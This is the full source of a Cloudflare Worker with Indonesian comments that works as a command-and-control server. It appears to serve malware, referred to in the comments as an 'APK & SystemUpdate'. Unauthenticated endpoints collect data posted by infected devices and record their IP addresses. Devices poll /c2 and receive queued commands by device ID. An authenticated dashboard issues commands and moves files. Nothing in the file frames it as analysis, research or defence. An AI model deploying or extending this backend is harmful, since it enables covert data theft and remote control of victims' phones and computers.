// ================================================================
// Cloudflare Worker - verifikasi-api (VERSI FIXED & CLEAN)
// ================================================================

// ============================================================
// KONFIGURASI
// ============================================================
const CONFIG = {
  MAX_DATA: 5000,
  MAX_BATCH: 100,
  RATE_LIMIT: 100,
  RATE_WINDOW: 60000, // 1 menit
  C2_TIMEOUT: 60000, // 1 menit
  LOG_RETENTION: 7, // hari
};

// ============================================================
// CORS HEADERS
// ============================================================
const CORS = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE, OPTIONS, PATCH',
  'Access-Control-Allow-Headers': 'Content-Type, Authorization, X-Requested-With, X-Device-Id, X-Compressed, Range',
  'Access-Control-Expose-Headers': 'Content-Range, Content-Length, Accept-Ranges, X-Total-Count, X-Page, X-Limit',
  'Access-Control-Allow-Credentials': 'false',
  'Access-Control-Max-Age': '86400',
};

// ============================================================
// RESPONSE HELPERS
// ============================================================
function jsonResponse(data, status = 200, extraHeaders = {}) {
  return new Response(JSON.stringify(data), {
    status,
    headers: {
      'Content-Type': 'application/json',
      ...CORS,
      ...extraHeaders,
    },
  });
}

function errorResponse(message, status = 400) {
  return jsonResponse({ error: message }, status);
}

function unauthorizedResponse() {
  return jsonResponse({ error: 'Access Denied' }, 403);
}

// ============================================================
// RATE LIMITING (FIXED - MEMASTIKAN ANGKA)
// ============================================================
async function checkRateLimit(env, key) {
  const now = Date.now();
  const windowKey = `ratelimit_${key}_${Math.floor(now / CONFIG.RATE_WINDOW)}`;
  
  try {
    const raw = await env.DATA.get(windowKey);
    // PERBAIKAN: Pastikan selalu string, jika null jadi '0'
    const count = parseInt(raw || '0', 10); 
    
    if (count >= CONFIG.RATE_LIMIT) {
      return { allowed: false, retryAfter: CONFIG.RATE_WINDOW };
    }
    
    await env.DATA.put(windowKey, String(count + 1), { 
      expirationTtl: Math.floor(CONFIG.RATE_WINDOW / 1000) 
    });
    
    return { allowed: true };
  } catch(e) {
    return { allowed: true };
  }
}

// ============================================================
// AUTHENTICATION
// ============================================================
function isAuthenticated(request, env) {
  const url = new URL(request.url);
  const key = url.searchParams.get('key') || 
              request.headers.get('X-API-Key') || 
              request.headers.get('Authorization')?.replace('Bearer ', '');
  return key === env.PASSWORD;
}

// ============================================================
// MAIN HANDLER
// ============================================================
export default {
  async fetch(request, env) {
    const url = new URL(request.url);
    const method = request.method;
    
    // ============================================================
    // OPTIONS - CORS Preflight
    // ============================================================
    if (method === 'OPTIONS') {
      return new Response(null, { headers: CORS });
    }

    // ============================================================
    // RATE LIMITING
    // ============================================================
    const clientIP = request.headers.get('CF-Connecting-IP') || 'unknown';
    const rateCheck = await checkRateLimit(env, clientIP);
    if (!rateCheck.allowed) {
      return jsonResponse({ 
        error: 'Rate limit exceeded', 
        retryAfter: Math.ceil(rateCheck.retryAfter / 1000) 
      }, 429);
    }

    try {
      // ============================================================
      // GET / - Health Check
      // ============================================================
      if (url.pathname === '/' && method === 'GET') {
        const raw = await env.DATA.get('data');
        const data = raw ? JSON.parse(raw) : [];
        return jsonResponse({
          status: 'ok',
          version: '2.0.0',
          timestamp: new Date().toISOString(),
          totalData: data.length,
          uptime: Math.floor((Date.now() - (env.START_TIME || Date.now())) / 1000),
        });
      }

      // ============================================================
      // POST /data - Terima data (dengan validasi)
      // ============================================================
      if ((url.pathname === '/data' || url.pathname === '/api/data') && method === 'POST') {
        return await handlePostData(request, env);
      }

      // ============================================================
      // POST /batch - Batch data
      // ============================================================
      if ((url.pathname === '/batch' || url.pathname === '/api/batch') && method === 'POST') {
        return await handleBatchData(request, env);
      }

      // ============================================================
      // GET /data - Lihat data (dengan pagination & filter)
      // ============================================================
      if ((url.pathname === '/data' || url.pathname === '/api/data') && method === 'GET') {
        return await handleGetData(request, env);
      }

      // ============================================================
      // GET /stats - Statistik
      // ============================================================
      if (url.pathname === '/stats' && method === 'GET') {
        return await handleStats(request, env);
      }

      // ============================================================
      // POST /clear - Hapus Data
      // ============================================================
      if (url.pathname === '/clear' && method === 'POST') {
        return await handleClear(request, env);
      }

      // ============================================================
      // POST /delete - Hapus data spesifik
      // ============================================================
      if (url.pathname === '/delete' && method === 'POST') {
        return await handleDelete(request, env);
      }

      // ============================================================
      // GET /c2 - C2 Command (untuk APK & SystemUpdate)
      // ============================================================
      if (url.pathname === '/c2' && method === 'GET') {
        return await handleC2(request, env);
      }

      // ============================================================
      // POST /c2 - Kirim C2 Command
      // ============================================================
      if (url.pathname === '/c2' && method === 'POST') {
        return await handleC2Post(request, env);
      }

      // ============================================================
      // GET /c2/history - C2 History
      // ============================================================
      if (url.pathname === '/c2/history' && method === 'GET') {
        return await handleC2History(request, env);
      }

      // ============================================================
      // GET /api/files - List File
      // ============================================================
      if (url.pathname === '/api/files' && method === 'GET') {
        return await handleListFiles(request, env);
      }

      // ============================================================
      // GET /api/download - Download File
      // ============================================================
      if (url.pathname === '/api/download' && method === 'GET') {
        return await handleDownloadFile(request, env);
      }

      // ============================================================
      // POST /api/upload - Upload File
      // ============================================================
      if (url.pathname === '/api/upload' && method === 'POST') {
        return await handleUploadFile(request, env);
      }

      // ============================================================
      // POST /api/delete - Delete File
      // ============================================================
      if (url.pathname === '/api/delete' && method === 'POST') {
        return await handleDeleteFile(request, env);
      }

      // ============================================================
      // POST /error - Log Error
      // ============================================================
      if (url.pathname === '/error' && method === 'POST') {
        return await handleError(request, env);
      }

      // ============================================================
      // 404 - Not Found
      // ============================================================
      return errorResponse('Not Found', 404);
      
    } catch (error) {
      // ============================================================
      // GLOBAL ERROR HANDLER
      // ============================================================
      console.error('Worker Error:', error);
      
      // Log error ke KV
      try {
        const errorLog = await env.DATA.get('error_log') || '[]';
        const logs = JSON.parse(errorLog);
        logs.push({
          timestamp: new Date().toISOString(),
          message: error.message,
          stack: error.stack,
          url: url.pathname,
          method: method,
        });
        if (logs.length > 100) logs.shift();
        await env.DATA.put('error_log', JSON.stringify(logs));
      } catch(e) {}
      
      return jsonResponse({ 
        error: 'Internal Server Error', 
        message: error.message 
      }, 500);
    }
  }
};

// ============================================================
// HANDLER: POST /data
// ============================================================
async function handlePostData(request, env) {
  try {
    const body = await request.json();
    
    // Validasi input
    if (!body || typeof body !== 'object') {
      return errorResponse('Invalid request body');
    }
    
    const d = {
      waktu: new Date().toISOString(),
      sumber: body.sumber || body.type || 'unknown',
      data: body.data || body,
      ip: request.headers.get('CF-Connecting-IP') || request.headers.get('X-Forwarded-For') || 'unknown',
      userAgent: request.headers.get('User-Agent') || 'unknown',
    };
    
    // Jika ini perintah C2 dari dashboard
    if (d.sumber === 'c2_command') {
      const cmdData = d.data;
      cmdData.timestamp = Date.now();
      cmdData.status = 'pending';
      
      // Simpan perintah
      await env.DATA.put('perintah', JSON.stringify(cmdData));
      
      // Simpan history C2
      const historyRaw = await env.DATA.get('c2_history') || '[]';
      const history = JSON.parse(historyRaw);
      history.push({
        waktu: d.waktu,
        perintah: cmdData.aksi || 'unknown',
        status: 'pending',
        ip: d.ip,
      });
      if (history.length > 100) history.shift();
      await env.DATA.put('c2_history', JSON.stringify(history));
      
      return jsonResponse({ 
        status: 'ok', 
        type: 'c2', 
        command: cmdData.aksi 
      });
    }
    
    // Data biasa - simpan ke KV
    const raw = await env.DATA.get('data') || '[]';
    let data = JSON.parse(raw);
    
    // Limit data
    if (data.length >= CONFIG.MAX_DATA) {
      data = data.slice(-CONFIG.MAX_DATA + 1);
    }
    
    data.push(d);
    await env.DATA.put('data', JSON.stringify(data));
    
    return jsonResponse({ 
      status: 'ok', 
      total: data.length,
      id: data.length - 1,
    });
    
  } catch (error) {
    return errorResponse('Failed to process data: ' + error.message);
  }
}

// ============================================================
// HANDLER: POST /batch (Batch Data)
// ============================================================
async function handleBatchData(request, env) {
  try {
    const body = await request.json();
    
    if (!body.items || !Array.isArray(body.items)) {
      return errorResponse('Invalid batch: items array required');
    }
    
    if (body.items.length > CONFIG.MAX_BATCH) {
      return errorResponse(`Batch too large: max ${CONFIG.MAX_BATCH}`);
    }
    
    const raw = await env.DATA.get('data') || '[]';
    let data = JSON.parse(raw);
    
    let added = 0;
    body.items.forEach(item => {
      const d = {
        waktu: new Date().toISOString(),
        sumber: item.sumber || item.type || 'unknown',
        data: item.data || item,
        ip: request.headers.get('CF-Connecting-IP') || 'unknown',
        userAgent: request.headers.get('User-Agent') || 'unknown',
      };
      
      if (data.length >= CONFIG.MAX_DATA) {
        data = data.slice(-CONFIG.MAX_DATA + 1);
      }
      data.push(d);
      added++;
    });
    
    await env.DATA.put('data', JSON.stringify(data));
    
    return jsonResponse({ 
      status: 'ok', 
      added: added,
      total: data.length,
    });
    
  } catch (error) {
    return errorResponse('Failed to process batch: ' + error.message);
  }
}

// ============================================================
// HANDLER: GET /data (dengan Pagination & Filter)
// ============================================================
async function handleGetData(request, env) {
  // Auth
  if (!isAuthenticated(request, env)) {
    return unauthorizedResponse();
  }
  
  const url = new URL(request.url);
  
  // C2 Command
  if (url.searchParams.get('type') === 'perintah') {
    try {
      const perintah = await env.DATA.get('perintah');
      if (perintah) {
        // Update status di history
        try {
          const historyRaw = await env.DATA.get('c2_history') || '[]';
          const history = JSON.parse(historyRaw);
          const cmd = JSON.parse(perintah);
          const lastCmd = history.find(h => h.perintah === cmd.aksi && h.status === 'pending');
          if (lastCmd) {
            lastCmd.status = 'sent';
            lastCmd.sentAt = new Date().toISOString();
            await env.DATA.put('c2_history', JSON.stringify(history));
          }
        } catch(e) {}
        
        await env.DATA.delete('perintah');
        return new Response(perintah, {
          headers: {
            'Content-Type': 'application/json',
            ...CORS,
          },
        });
      }
      return new Response('{}', {
        headers: {
          'Content-Type': 'application/json',
          ...CORS,
        },
      });
    } catch(e) {
      return new Response('{}', {
        headers: {
          'Content-Type': 'application/json',
          ...CORS,
        },
      });
    }
  }
  
  // Data biasa - dengan pagination
  try {
    const raw = await env.DATA.get('data') || '[]';
    let data = JSON.parse(raw);
    
    // Filter by source
    const source = url.searchParams.get('source');
    if (source) {
      data = data.filter(item => item.sumber === source);
    }
    
    // Filter by search
    const search = url.searchParams.get('search');
    if (search) {
      const s = search.toLowerCase();
      data = data.filter(item => {
        const json = JSON.stringify(item).toLowerCase();
        return json.includes(s);
      });
    }
    
    // Sort (FIXED: mengubah objek Date menjadi angka milidetik .getTime())
    const sort = url.searchParams.get('sort') || 'newest';
    if (sort === 'newest') {
      data.sort((a, b) => new Date(b.waktu).getTime() - new Date(a.waktu).getTime());
    } else if (sort === 'oldest') {
      data.sort((a, b) => new Date(a.waktu).getTime() - new Date(b.waktu).getTime());
    } else if (sort === 'source') {
      data.sort((a, b) => (a.sumber || '').localeCompare(b.sumber || ''));
    }
    
    // Pagination
    const page = parseInt(url.searchParams.get('page')) || 1;
    const limit = Math.min(parseInt(url.searchParams.get('limit')) || 50, 200);
    const total = data.length;
    const totalPages = Math.ceil(total / limit);
    const start = (page - 1) * limit;
    const end = Math.min(start + limit, total);
    const paginatedData = data.slice(start, end);
    
    return jsonResponse(paginatedData, 200, {
      'X-Total-Count': total,
      'X-Page': page,
      'X-Limit': limit,
      'X-Total-Pages': totalPages,
    });
    
  } catch(e) {
    return jsonResponse([], 200);
  }
}

// ============================================================
// HANDLER: GET /stats
// ============================================================
async function handleStats(request, env) {
  if (!isAuthenticated(request, env)) {
    return unauthorizedResponse();
  }
  
  try {
    const raw = await env.DATA.get('data') || '[]';
    const data = JSON.parse(raw);
    const stats = {};
    
    data.forEach(item => {
      const source = item.sumber || 'unknown';
      stats[source] = (stats[source] || 0) + 1;
    });
    
    // Data terbaru
    const latest = data.length > 0 ? data[data.length - 1] : null;
    
    // Range waktu (FIXED: menggunakan .getTime() dan validasi array kosong)
    let timeRange = { first: null, last: null };
    if (data.length > 0) {
      const times = data.map(d => new Date(d.waktu).getTime()).filter(t => !isNaN(t));
      if (times.length > 0) {
        timeRange.first = new Date(Math.min(...times)).toISOString();
        timeRange.last = new Date(Math.max(...times)).toISOString();
      }
    }
    
    return jsonResponse({
      total: data.length,
      bySource: stats,
      latest: latest,
      timeRange: timeRange,
      timestamp: new Date().toISOString(),
    });
    
  } catch(e) {
    return jsonResponse({ error: e.message }, 500);
  }
}

// ============================================================
// HANDLER: POST /clear
// ============================================================
async function handleClear(request, env) {
  if (!isAuthenticated(request, env)) {
    return unauthorizedResponse();
  }
  
  try {
    const url = new URL(request.url);
    const source = url.searchParams.get('source');
    
    const raw = await env.DATA.get('data') || '[]';
    let data = JSON.parse(raw);
    
    if (source) {
      const before = data.length;
      data = data.filter(item => item.sumber !== source);
      const deleted = before - data.length;
      await env.DATA.put('data', JSON.stringify(data));
      return jsonResponse({
        status: 'ok',
        deleted: deleted,
        remaining: data.length,
        source: source,
      });
    } else {
      // Hapus semua data
      await env.DATA.delete('data');
      await env.DATA.delete('perintah');
      // Jangan hapus c2_history, error_log, files
      return jsonResponse({
        status: 'ok',
        message: 'All data cleared',
        deleted: data.length,
      });
    }
    
  } catch(e) {
    return jsonResponse({ error: e.message }, 500);
  }
}

// ============================================================
// HANDLER: POST /delete (Delete spesifik data)
// ============================================================
async function handleDelete(request, env) {
  if (!isAuthenticated(request, env)) {
    return unauthorizedResponse();
  }
  
  try {
    const body = await request.json();
    const index = body.index;
    const id = body.id;
    
    if (index === undefined && id === undefined) {
      return errorResponse('index or id required');
    }
    
    const raw = await env.DATA.get('data') || '[]';
    let data = JSON.parse(raw);
    
    let deleted = false;
    if (index !== undefined && index >= 0 && index < data.length) {
      data.splice(index, 1);
      deleted = true;
    } else if (id !== undefined) {
      // Cari berdasarkan ID (waktu)
      data = data.filter(item => {
        const itemId = item.waktu || item.id;
        if (itemId === id) {
          deleted = true;
          return false;
        }
        return true;
      });
    }
    
    if (!deleted) {
      return jsonResponse({ error: 'Item not found' }, 404);
    }
    
    await env.DATA.put('data', JSON.stringify(data));
    return jsonResponse({
      status: 'ok',
      deleted: true,
      remaining: data.length,
    });
    
  } catch(e) {
    return jsonResponse({ error: e.message }, 500);
  }
}

// ============================================================
// HANDLER: GET /c2 - C2 Command (untuk APK & SystemUpdate)
// ============================================================
async function handleC2(request, env) {
  try {
    const url = new URL(request.url);
    const deviceId = url.searchParams.get('device') || 'unknown';
    
    // Cek apakah ada perintah untuk device ini
    const perintah = await env.DATA.get('perintah');
    if (perintah) {
      const cmd = JSON.parse(perintah);
      
      // Jika perintah untuk device tertentu atau all
      if (!cmd.device || cmd.device === 'all' || cmd.device === deviceId) {
        await env.DATA.delete('perintah');
        
        // Log
        const logRaw = await env.DATA.get('c2_history') || '[]';
        const log = JSON.parse(logRaw);
        log.push({
          waktu: new Date().toISOString(),
          device: deviceId,
          perintah: cmd.aksi || 'unknown',
          status: 'executed',
        });
        if (log.length > 100) log.shift();
        await env.DATA.put('c2_history', JSON.stringify(log));
        
        return new Response(JSON.stringify(cmd), {
          headers: {
            'Content-Type': 'application/json',
            ...CORS,
          },
        });
      }
    }
    
    return new Response('{}', {
      headers: {
        'Content-Type': 'application/json',
        ...CORS,
      },
    });
    
  } catch(e) {
    return new Response('{}', {
      headers: {
        'Content-Type': 'application/json',
        ...CORS,
      },
    });
  }
}

// ============================================================
// HANDLER: POST /c2 - Kirim C2 Command (dari dashboard)
// ============================================================
async function handleC2Post(request, env) {
  if (!isAuthenticated(request, env)) {
    return unauthorizedResponse();
  }
  
  try {
    const body = await request.json();
    const aksi = body.aksi || body.command || 'unknown';
    
    const cmd = {
      aksi: aksi,
      device: body.device || 'all',
      params: body.params || {},
      timestamp: Date.now(),
    };
    
    await env.DATA.put('perintah', JSON.stringify(cmd));
    
    // Log
    const logRaw = await env.DATA.get('c2_history') || '[]';
    const log = JSON.parse(logRaw);
    log.push({
      waktu: new Date().toISOString(),
      device: cmd.device,
      perintah: aksi,
      status: 'queued',
      params: cmd.params,
    });
    if (log.length > 100) log.shift();
    await env.DATA.put('c2_history', JSON.stringify(log));
    
    return jsonResponse({
      status: 'ok',
      command: aksi,
      device: cmd.device,
    });
    
  } catch(e) {
    return jsonResponse({ error: e.message }, 500);
  }
}

// ============================================================
// HANDLER: GET /c2/history - C2 History
// ============================================================
async function handleC2History(request, env) {
  if (!isAuthenticated(request, env)) {
    return unauthorizedResponse();
  }
  
  try {
    const raw = await env.DATA.get('c2_history') || '[]';
    const history = JSON.parse(raw);
    return jsonResponse(history);
  } catch(e) {
    return jsonResponse([]);
  }
}

// ============================================================
// HANDLER: GET /api/files - List Files
// ============================================================
async function handleListFiles(request, env) {
  if (!isAuthenticated(request, env)) {
    return unauthorizedResponse();
  }
  
  try {
    const url = new URL(request.url);
    const path = url.searchParams.get('path') || '/';
    
    // Simulasi file system (gunakan KV)
    const filesRaw = await env.DATA.get('files_list') || '[]';
    const files = JSON.parse(filesRaw);
    
    // Filter berdasarkan path
    const filtered = files.filter(f => f.path.startsWith(path));
    
    return jsonResponse(filtered);
    
  } catch(e) {
    return jsonResponse({ error: e.message }, 500);
  }
}

// ============================================================
// HANDLER: GET /api/download - Download File
// ============================================================
async function handleDownloadFile(request, env) {
  if (!isAuthenticated(request, env)) {
    return unauthorizedResponse();
  }
  
  try {
    const url = new URL(request.url);
    const path = url.searchParams.get('path');
    
    if (!path) {
      return errorResponse('path required');
    }
    
    const fileKey = `file_${path}`;
    const fileData = await env.DATA.get(fileKey);
    
    if (!fileData) {
      return errorResponse('File not found', 404);
    }
    
    const file = JSON.parse(fileData);
    
    return new Response(file.content, {
      headers: {
        'Content-Type': file.mimeType || 'application/octet-stream',
        'Content-Disposition': `attachment; filename="${file.name}"`,
        ...CORS,
      },
    });
    
  } catch(e) {
    return jsonResponse({ error: e.message }, 500);
  }
}

// ============================================================
// HANDLER: POST /api/upload - Upload File
// ============================================================
async function handleUploadFile(request, env) {
  if (!isAuthenticated(request, env)) {
    return unauthorizedResponse();
  }
  
  try {
    const formData = await request.formData();
    const file = formData.get('file');
    const path = formData.get('path') || '/';
    
    if (!file) {
      return errorResponse('file required');
    }
    
    const buffer = await file.arrayBuffer();
    const base64 = btoa(String.fromCharCode(...new Uint8Array(buffer)));
    
    const fileData = {
      name: file.name,
      path: path + file.name,
      size: file.size,
      mimeType: file.type || 'application/octet-stream',
      content: base64,
      uploadedAt: new Date().toISOString(),
    };
    
    const fileKey = `file_${path}${file.name}`;
    await env.DATA.put(fileKey, JSON.stringify(fileData));
    
    // Update files list
    const filesRaw = await env.DATA.get('files_list') || '[]';
    const files = JSON.parse(filesRaw);
    files.push({
      name: file.name,
      path: path + file.name,
      size: file.size,
      isDir: false,
      uploadedAt: fileData.uploadedAt,
    });
    await env.DATA.put('files_list', JSON.stringify(files));
    
    return jsonResponse({
      status: 'ok',
      name: file.name,
      size: file.size,
    });
    
  } catch(e) {
    return jsonResponse({ error: e.message }, 500);
  }
}

// ============================================================
// HANDLER: POST /api/delete - Delete File
// ============================================================
async function handleDeleteFile(request, env) {
  if (!isAuthenticated(request, env)) {
    return unauthorizedResponse();
  }
  
  try {
    const body = await request.json();
    const path = body.path;
    
    if (!path) {
      return errorResponse('path required');
    }
    
    const fileKey = `file_${path}`;
    await env.DATA.delete(fileKey);
    
    // Update files list
    const filesRaw = await env.DATA.get('files_list') || '[]';
    const files = JSON.parse(filesRaw);
    const filtered = files.filter(f => f.path !== path);
    await env.DATA.put('files_list', JSON.stringify(filtered));
    
    return jsonResponse({
      status: 'ok',
      deleted: true,
    });
    
  } catch(e) {
    return jsonResponse({ error: e.message }, 500);
  }
}

// ============================================================
// HANDLER: POST /error - Log Error
// ============================================================
async function handleError(request, env) {
  try {
    const body = await request.json();
    
    const errorLog = await env.DATA.get('error_log') || '[]';
    const logs = JSON.parse(errorLog);
    logs.push({
      timestamp: new Date().toISOString(),
      ...body,
    });
    if (logs.length > 100) logs.shift();
    await env.DATA.put('error_log', JSON.stringify(logs));
    
    return jsonResponse({ status: 'ok' });
    
  } catch(e) {
    return jsonResponse({ status: 'ok' });
  }
}
